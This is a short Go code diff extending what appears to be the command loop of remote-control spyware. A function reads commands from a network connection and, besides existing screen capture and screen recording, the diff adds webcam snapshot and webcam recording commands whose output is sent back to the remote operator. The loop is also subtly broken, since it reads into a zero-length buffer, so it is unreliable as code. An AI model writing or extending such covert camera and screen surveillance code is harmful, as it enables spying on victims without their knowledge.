@@ -99,11 +99,18 @@ func engage_via(conn net.Conn) {
 	for {
 		var cmd, result string
 		conn.Read([]byte(cmd))
+		
 		if cmd == "capture_screen" {
 			result = screen_capture()
 			conn.Write([]byte(result))
 		} else if cmd == "record_screen" {
 			result = video_recording(0, 5)
+			conn.Write([]byte(result))
+		} else if cmd == "capture_webcam" {
+			result = webcam_snap()
+			conn.Write([]byte(result))
+		} else if cmd == "record_webcam" {
+			result = video_recording(1, 5)
 			conn.Write([]byte(result))
 		}
 	}
